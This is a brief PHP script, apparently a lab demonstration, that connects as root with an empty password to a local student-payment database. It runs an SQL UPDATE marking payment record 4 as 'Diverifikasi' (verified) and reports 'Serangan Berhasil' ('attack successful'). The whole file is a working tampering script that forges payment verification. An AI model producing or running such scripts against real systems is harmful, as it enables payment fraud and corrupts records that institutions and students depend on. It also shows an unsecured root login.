<?php

$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'pembayaran_mahasiswa';

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name) or die('Koneksi ke Database Gagal');

$query = 'UPDATE pembayaran SET status_verifikasi="Diverifikasi" WHERE id_pembayaran=4;';

$result = $conn->query($query);
if ($result) {
    echo "Serangan Berhasil !";
} else {
    echo "Serangan Gagal : " . $conn->error;
}

$conn->close();
